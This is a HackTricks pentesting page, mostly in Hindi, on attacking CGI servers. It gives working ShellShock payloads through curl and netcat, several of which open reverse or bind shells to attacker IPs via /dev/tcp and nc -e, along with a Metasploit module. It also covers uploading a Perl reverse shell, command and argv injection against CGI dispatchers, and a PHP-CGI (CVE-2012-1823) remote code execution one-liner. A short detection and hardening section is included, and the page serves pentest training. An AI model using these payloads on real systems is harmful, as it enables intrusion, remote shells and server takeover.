# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## जानकारी

The **CGI scripts are perl scripts**, so, if you have compromised a server that can execute _**.cgi**_ scripts you can **upload a perl reverse shell** (`/usr/share/webshells/perl/perl-reverse-shell.pl`), **change the extension** from **.pl** to **.cgi**, give **execute permissions** (`chmod +x`) and **access** the reverse shell **from the web browser** to execute it.  
CGI vulns की जाँच के लिए `nikto -C all` (और सभी plugins) का उपयोग करने की सिफारिश की जाती है।

## **ShellShock**

**ShellShock** एक vulnerability है जो व्यापक रूप से उपयोग किए जाने वाले **Bash** command-line shell को Unix-based operating systems में प्रभावित करती है। यह उन परिस्थितियों को निशाना बनाती है जहाँ Bash को applications द्वारा पास किए गए commands चलाने होते हैं। Vulnerability का मूल कारण **environment variables** का manipulation है, जो dynamic named values होते हैं और यह प्रभावित करते हैं कि कंप्यूटर पर processes कैसे चलते हैं। Attackers इसे exploit कर सकते हैं — environment variables में malicious code attach करके, जो variable मिलने पर execute हो जाता है। इससे attackers सिस्टम को संभावित रूप से compromise कर सकते हैं।

इस vulnerability का exploit करने पर पेज error फेंक सकता है।

आप इस vulnerability को इस बात से पा सकते हैं कि यह पुराने **Apache** version और **cgi_mod** (cgi फ़ोल्डर के साथ) का उपयोग कर रहा है, या `nikto` का उपयोग करके।

### **परीक्षण**

अधिकांश परीक्षणों में कुछ echo किया जाता है और उम्मीद की जाती है कि वह string वेब response में लौटेगी। यदि आपको लगता है कि कोई पेज vulnerable हो सकता है, तो सभी **cgi** पेज खोजें और उनका परीक्षण करें।

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflected, blind and out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## केंद्रीकृत CGI डिस्पैचर्स (single endpoint routing via selector parameters)

कई embedded web UIs एकल CGI endpoint के पीछे दर्जनों privileged actions को multiplex करते हैं (उदाहरण के लिए, `/cgi-bin/cstecgi.cgi`) और अनुरोध को internal function तक route करने के लिए `topicurl=<handler>` जैसे selector parameter का उपयोग करते हैं।

इन routers को एक्सप्लॉइट करने की कार्यप्रणाली:

- handler नाम गिनें: scrape JS/HTML, brute-force with wordlists, या firmware unpack करके dispatcher द्वारा उपयोग किए गए handler strings के लिए grep करें।
- Test unauthenticated reachability: कुछ handlers auth checks भूल जाते हैं और सीधे callable होते हैं।
- उन handlers पर ध्यान दें जो system utilities को invoke करते हैं या files को touch करते हैं; कमजोर validators अक्सर केवल कुछ characters को ही block करते हैं और शायद leading hyphen `-` को मिस कर देते हैं।

सामान्य exploit रूप:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
Detection and hardening:

- सेंट्रलाइज़्ड CGI endpoints पर उन प्रमाणीकरणहीन अनुरोधों पर निगरानी रखें जिनमें `topicurl` संवेदनशील handlers पर सेट हो।
- उन parameters को फ्लैग करें जो `-` से शुरू होते हैं (argv option injection attempts)।
- विक्रेताओं: सभी state-changing handlers पर authentication लागू करें, कठोर allowlists/types/lengths का उपयोग करके validate करें, और कभी भी user-controlled strings को command-line flags के रूप में पास न करें।

## पुराना PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

Basically if cgi is active and php is "old" \(&lt;5.3.12 / &lt; 5.4.2\) you can execute code.
इस vulnerability को exploit करने के लिए आपको वेब सर्वर की किसी PHP फ़ाइल तक बिना parameters भेजे पहुँचने की जरूरत है \(विशेषकर बिना "=" कैरेक्टर भेजे\)।
फिर, इस vulnerability का परीक्षण करने के लिए आप उदाहरण के लिए `/index.php?-s` \(ध्यान दें `-s`\) तक पहुँच सकते हैं और **source code of the application will appear in the response**।

फिर, **RCE** प्राप्त करने के लिए आप यह विशेष query भेज सकते हैं: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` और **PHP code** को request के **body** में भेजें जिससे वह execute हो।
Example:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**vuln और संभावित exploits के बारे में अधिक जानकारी:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM वेब सर्वर अनुरोधों के लिए\)**

CGI http request में प्रत्येक header के लिए एक environment variable बनाता है। उदाहरण के लिए: "host:web.com" को "HTTP_HOST"="web.com" के रूप में बनाया जाता है।

HTTP_PROXY variable का उपयोग web server द्वारा किया जा सकता है। एक **header** भेजने की कोशिश करें जिसमें यह हो: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**" और यदि server session के दौरान कोई request करता है, तो आप server द्वारा किए गए प्रत्येक request को कैप्चर कर पाएंगे।

## **संदर्भ**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
